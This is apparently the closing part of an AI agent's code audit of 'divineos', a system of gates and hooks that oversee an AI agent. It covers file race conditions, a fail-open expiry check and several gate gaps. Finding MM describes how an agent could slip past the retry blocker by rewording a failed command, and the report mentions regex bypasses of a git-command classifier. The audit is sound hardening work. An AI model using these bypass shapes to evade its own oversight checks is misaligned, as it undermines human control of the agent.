The atomic-write-text fix was applied to 8 marker files in `core/`. But the same read-modify-write pattern WITHOUT atomic write (and without locking) appears in **29 other modules**:

```python
# Pattern that repeats:
data = json.loads(path.read_text(encoding="utf-8"))
data["counter"] += 1
path.write_text(json.dumps(data), encoding="utf-8")  # ← not atomic; no lock
```

Full list of affected modules:

| Layer | Module |
|---|---|
| Hooks | `post_tool_use_checkpoint.py` (Finding GG) |
| Core | `hud_handoff.py` (Finding HH) |
| Core | `theater_audit.py` |
| Core | `operating_loop_audit.py` |
| Core | `pull_detection.py` |
| Core | `structural_fix_tracker.py` |
| Core | `actor_registry.py` |
| Core | `briefing_freshness.py` |
| Core | `curiosity_engine.py` |
| Core | `resonant_truth.py` |
| Core | `consultation_tracker.py` (also Finding B, untested) |
| Core | `lepos_channel_check.py` (also Finding Q, no PRAGMAs) |
| Core | `fix_verifier.py` |
| Core | `lifecycle.py` |
| Core | `session_checkpoint.py` |
| Core | `skill_library.py` |
| Core | `rest.py` |
| Core | `mid_turn_surfacer.py` |
| Core | `planning_commitments.py` |
| Core | `self_model.py` |
| Core | `lesson_interrupt.py` |
| Core | `hud_state.py` |
| Core | `retry_blocker.py` |
| Core | `multiplex_state.py` |
| Core | `failure_diagnostics.py` |
| Core | `supervisor/circuit_breaker.py` |
| CLI | `hud_commands.py` |
| CLI | `knowledge_health_commands.py` |
| Analysis | `analysis.py` |

**Most concerning** (load-bearing gate state that drives discipline):
- `circuit_breaker.py` — fault-tolerance state. Concurrent failure records can undercount, never trip
- `briefing_freshness.py` — briefing-loaded gate
- `lifecycle.py` — session lifecycle state
- `retry_blocker.py` — blind-retry prevention
- `pull_detection.py` — fabrication marker state
- `structural_fix_tracker.py` — pending structural fix obligations (named load-bearing 2026-05-14)
- `actor_registry.py` — actor authentication state (Phase 1)
- `theater_audit.py` — theater detection
- `lesson_interrupt.py` — chronic-lesson interrupt cooldown

**Fix-shape**: a 30-minute mechanical refactor to route all writes through `atomic_write_text`. Combined with file-level locking (fcntl on POSIX, msvcrt on Windows) for the read-modify-write atomicity. OR replace with SQLite-backed counters (which provide ACID via the canonical PRAGMAs).

A single shared utility `read_modify_write_state(path, modify_fn)` could close all 29 instances:

```python
def read_modify_write_state(path: Path, modify_fn: Callable[[dict], dict]) -> None:
    with FileLock(str(path) + ".lock"):
        data = json.loads(path.read_text(encoding="utf-8")) if path.exists() else {}
        new_data = modify_fn(data)
        atomic_write_text(path, json.dumps(new_data, indent=2))
```

**Severity**: medium. Currently observable failures are sporadic (race conditions only manifest under specific timing). Latent risk: high — 29 load-bearing state files with the same vulnerability. Could be a one-day mechanical fix.

---

## Finding LL (low-medium) — `load_handoff_note` skips expiry check when `written_at` is missing

**File**: `src/divineos/core/hud_handoff.py` lines 105-112
**Status**: Real — falsy-check creates no-expiry path for malformed notes

```python
def load_handoff_note() -> dict[str, Any] | None:
    ...
    try:
        result = json.loads(path.read_text(encoding="utf-8"))
        written_at = result.get("written_at", 0)
        if written_at and (time.time() - written_at) > _HANDOFF_EXPIRY_SECONDS:
            path.unlink(missing_ok=True)
            return None
        return result
    except (json.JSONDecodeError, OSError):
        return None
```

**The bug**: `result.get("written_at", 0)` returns 0 if the field is missing. Then `if written_at and ...` — 0 is falsy, so the expiry check is **skipped**. The handoff note is returned without expiry validation.

**Failure scenario**:
1. A handoff note is written with malformed structure (missing `written_at` field due to a serialization bug, mid-write crash, or schema migration)
2. `load_handoff_note` reads it
3. The expiry check is silently skipped
4. The note is treated as fresh forever — even if it's months old

The 12-hour auto-expire that the docstring promises ("Returns None and auto-clears if the note is older than 12 hours") doesn't fire for notes missing `written_at`.

**Fix-shape**: invert the logic:
```python
written_at = result.get("written_at")  # don't default to 0
if written_at is None:
    # No timestamp → can't verify freshness → safer to discard
    path.unlink(missing_ok=True)
    return None
if (time.time() - written_at) > _HANDOFF_EXPIRY_SECONDS:
    path.unlink(missing_ok=True)
    return None
return result
```

Treat missing-timestamp as expired (fail-closed) rather than as "no check needed" (fail-open).

**Severity**: low-medium. Requires a malformed note to exploit; current write paths always include `written_at`. Latent vulnerability if any future write path forgets the field.

---

## Finding MM (low) — retry_blocker signature is fragile to invocation form

**File**: `src/divineos/core/retry_blocker.py` lines 41-58
**Status**: By-design over-inclusive; documented; worth marking

The retry-blocker's command signature uses first 3 words of the Bash command:
```python
if tool_name == "Bash":
    cmd = tool_input.get("command", "")
    parts = cmd.split()[:3]
    return f"Bash:{' '.join(parts)}"
```

**Empirical bypass shapes**:
- `pytest tests/foo.py` → signature `Bash:pytest tests/foo.py`
- `python -m pytest tests/foo.py` → signature `Bash:python -m pytest` (different!)
- `cd /tmp && pytest tests/foo.py` → signature `Bash:cd /tmp &&` (different!)

So an agent that just failed `pytest tests/foo.py` could switch to `python -m pytest tests/foo.py` and the retry blocker wouldn't recognize it as the same command. The blind retry continues.

**The design tradeoff is documented** in the module: "Over-inclusive by design — false positives are cheap (agent just has to read something first), false negatives are expensive (blind retry loop continues)." But the implementation doesn't actually achieve over-inclusive — these alternate-invocation cases are false NEGATIVES (the gate misses what it should catch).

**Fix-shape**: normalize commands before signature extraction. Strip leading `cd ... && `, normalize `python -m X` ↔ `X` aliases. Or extract the "load-bearing verb" (pytest, ruff, mypy, ...) regardless of invocation prefix.

**Severity**: low. The retry blocker is a discipline aid, not a hard gate. Bypass is via alternate-invocation, requires the agent to actively work around it.

---

## Finding H (informational) — pre-commit gate not auto-installed

**File**: `setup/setup-hooks.sh` (exists; must be run manually after clone)
**Status**: By design

Fresh clones don't have `.git/hooks/pre-commit` installed. Operators must run `bash setup/setup-hooks.sh` to install the pre-commit hook that runs `scripts/precommit.sh` (which in turn runs ruff/mypy/check_doc_counts/check_broad_exceptions/etc).

The README's claim "the pre-commit hook is advisory" is technically accurate even when installed — but if the hook ISN'T installed (in any environment without manual setup), the discipline is purely operator-memory.

**Why this matters**: between fresh-clone moments, operator-installed pre-commit can drift (especially if `.git/hooks/` gets clobbered by re-clone, worktree creation, etc.). The hook is "advisory" by design but its absence-rate is undetectable.

**Fix-shape (deferred — not blocking)**: documented setup is sufficient; if you want hardening, `setup/setup-hooks.sh` could check if pre-commit is already installed and re-install only if missing, AND `pyproject.toml`'s install hook could trigger setup-hooks on `pip install -e .`. Both are small adds; current approach is per documented design.

**Severity**: informational.

---

## What the existing gates ARE catching correctly

To balance the findings list — these all verified empirically:

- **Multi-party-review pre-push gate**: correctly blocks guardrail-touching commits without External-Review trailers; runs at push-time, not advisory
- **CI integrity-audit Phase 1**: textual trailer-presence verification on guardrail-touching commits in PRs (the off-host anchor that --no-verify can't bypass)
- **broad-exceptions check**: exits 0, no unexcused catches in current state
- **bypass-scanner test**: passes, no new agent-settable bypasses detected
- **wiring-contract test for operating_loop/**: all 17 tests pass, EXEMPT entries documented
- **attribution-audit-lineage scanner**: precision-over-recall design verified (4/4 true positives, 6/6 true negatives on synthetic samples)
- **exploration-recall tag-gated auto-surface**: ≥2-tag threshold empirically discriminates true topics from incidental words
- **prep-relay narrow-range block (F79 closure)**: empirically reproduces and blocks
- **andrew-correction-attestation gate**: no agent-settable bypass; only override path is visible commit
- **check_doc_counts**: correctly detects CLI command drift (4 over threshold of 3); auto-fix limitation noted as Finding C

---

## Pattern-attribution potential additions

Based on this audit, candidate pattern names worth considering for the canonical registry:

1. **substrate_module_untested**: a module gets shipped with callers but no direct tests. Failure-class: smoke-detector-in-drawer at the substrate-shaping layer. Empirical: 3 modules from May 19 consumer-pretender arc fit this pattern.

2. **stale_TODO_obligation**: a TODO comment names an obligation as "when X happens"; X has happened but the obligation wasn't fulfilled. Empirical: pattern_registry's "add to guardrails when committed" TODO.

3. **doc_drift_below_auto_fix**: a documentation count drifts but the auto-fix script doesn't know how to update that specific count. Empirical: CLI command count in README.md.

4. **gate_scoped_too_narrowly**: a structural gate is designed for a specific location and doesn't generalize to adjacent locations where the same failure-class could recur. Empirical: wiring-contract test only covers operating_loop/.

These are observations, not blocking recommendations. Aether's call on whether to register.

---

## Closing

Eight real medium-or-higher findings (A, B, I, K, L, P, Q, S). Fourteen lower-priority items. Four rounds of deepening hunt — each round surfaced new findings the prior round missed.

**The pattern across rounds**: each round found bugs the prior round missed because each round probed a different layer:

- **Round 1**: enumerate-and-check (skipped tests, TODOs, untested modules, doc drift)
- **Round 2**: cross-path consistency (helper vs gate divergence, recency window mismatch, actor list mismatch)
- **Round 3**: adversarial regex probing (attribution-audit gaps, SQLite PRAGMA inconsistency)
- **Round 4**: gate-bypass shapes (gravity classifier misses, shell-script bypass logging gap)

Each round was cheap individually. None of them required new tools — just systematic probing. **The implication**: the architecture has more gaps than appear on first audit because audits typically check what's there, not what's missing. The "what's missing" space is much larger and requires explicit hunting.

This is itself a pattern worth naming: `audit_coverage_underestimates_gap_space`. Filing.

Things I verified clean across all four rounds:
- No security-class issues: zero pickle, zero unsafe yaml, zero shell=True/os.system, zero eval/exec
- mypy passes (0 issues across 486 source files)
- ruff lint + format passes
- broad-exceptions check exits 0
- bypass-scanner test passes (no current escapes via canonical pattern)
- wiring-contract test passes (17/17)
- settings.json structurally valid, all 19 referenced hook scripts exist on disk
- All `# noqa: T201/F401/S608` suppressions verified legitimate
- 0 syntax errors across all 486 source files
- ARCHITECTURE.md tree in sync with src/divineos/ filesystem
- All 50 guardrail-list entries exist on disk
- `_validate_actor()` robust against unicode-confusable spoofing
- `submit-round` requires `--source-ref` by default + fail-closed on uncertainty
- No mutable default arguments in src/
- Datetime handling: naive vs aware split is correct
- Test isolation well-designed (autouse db fixture, PID-based basetemp)
- No tests with empty bodies or wrong-direction assertions
- All actions/setup-python and actions/checkout pinned by major version (no @main/@master vulnerability)
- All CREATE TABLE statements consistent with documented schema
- Cosmetic-diff classifier is positive-list (safe-by-default)
- `submit_finding` has robust input validation (severity/category/stance enums + actor unicode-resistance)

### Prioritized highest-leverage fixes (updated)

1. **Finding P** (attribution-audit narrow scope): broaden regex variants
2. **Finding Q** (SQLite concurrency on load-bearing gates): canonical PRAGMAs
3. **Finding S** (gravity classifier regex bypasses): tokenize git commands
4. **Finding W** (store_knowledge silently ignores maturity): upgrade-only-on-dedup pattern
5. **Finding X** (validity gate fails-OPEN on bugs): narrow the except clause
6. **Findings K + L combined** (helper vs gate divergence): consolidate shared logic
7. **Finding A** (pattern_registry guardrails): 3-line fix
8. **Finding B** (untested substrate modules): three test files
9. **Finding Y** (store_knowledge can resurrect superseded): add supersession guard

### Pattern-attribution candidates to file

- `boundary_semantic_disagreement_with_stale_comment`: code paths internally coherent; boundaries between paths disagree on semantics (case-folding, dedup grain, supersession-handling). Findings W, Y, Z exemplify. Same shape as cross_path_divergence (K, L) at the data layer.
- `audit_verification_insufficiently_adversarial`: audits verify positive cases work and selected negative cases stay silent, but don't probe variants of positive cases. My CONFIRMS yesterday on attribution-audit was this shape.
- `regex_gate_coverage_narrower_than_docstring`: gates use narrow regex patterns; docstrings describe broader semantic intent; gap between letter and spirit lets shapes through. Findings P, S both exemplify.
- `cross_path_divergence_with_stale_comment`: two paths claim to implement same logic; comments claim consistency; actual implementations diverge. Findings K, L.
- `audit_coverage_underestimates_gap_space`: each audit round finds new gaps; finding rate doesn't decline after first pass. This audit-arc itself is the evidence.

Filing these explicitly because the patterns now have multiple empirical instances and would benefit from canonical-registry promotion.

— Aletheia
2026-05-20
(updated after nine rounds of deepening hunt)
